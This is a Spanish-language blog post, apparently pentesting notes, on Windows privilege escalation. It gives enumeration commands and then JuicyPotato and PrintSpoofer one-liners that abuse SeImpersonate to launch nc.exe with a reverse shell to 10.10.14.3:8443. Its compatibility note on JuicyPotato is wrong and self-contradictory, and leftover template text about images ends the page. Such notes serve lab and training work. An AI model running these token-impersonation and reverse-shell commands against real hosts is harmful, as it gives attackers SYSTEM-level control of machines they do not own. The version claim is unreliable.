---
title: Windowsprivesc
date: 2022-08-12 13:25:30 +/-TTTT
categories: [UTILITIES, Windows]
tags: [juicypotato, pipenames]     # TAG names should always be lowercase
---

## Windows Privilege Escalation
### Enumeración 

Con este comando podemos revisar el status de windows defender

```shell
Get-MpComputerStatus
```
Con este comando podemos ver las reglas de AppLocker

```shell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone
```

Con set podemos ver las variables de entorno esto solo en cmd

```shell
set
```
Para revisar la información del sistema esto para cmd

```shell
systeminfo
wmic qfe
wmic product get name
```
### Comunicaciones y procesos
En powershell podemos usar 

```shell
Get-WmiObject -Class Win32_Product | select Name, Version
```

Podemos ver `pipe names` con los siguientes comandos

```shell
gci \\.\pipe\ #PARA ENUMERAR LOS PIPES DISPONIBLES
accesschk -accepteula -w \pipe\cualquierpipe -v  #PODEMOS REVISAR LOS PERMISOS DE CUALQUIER PIPE NAME

```

### SeImpersonate and SeAssignPrimaryToken

Podemos abusar del privilegio `SeImpersonate` y `SeAssignPrimaryToken` para esto podmeos usar dos herramientas

#### JuicyPotato
```shell
JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe 10.10.14.3 8443 -e cmd.exe" -t *
```

#### PrintSpoofer
```shell
PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.14.3 8443 -e cmd"
```

> Juicy potato solo funciona en sistemas opertivos de windows 10 para Windows Server 2019 and Windows 10 build 1809 en adelante
{: .prompt-info }

CON ESTO PODEMOS USAR IMAGENES EN LA PÁGINA
"![superProxy-deployed](/posts/20210103/03-superProxy-deployed.png){: width="1366" height="354"}"
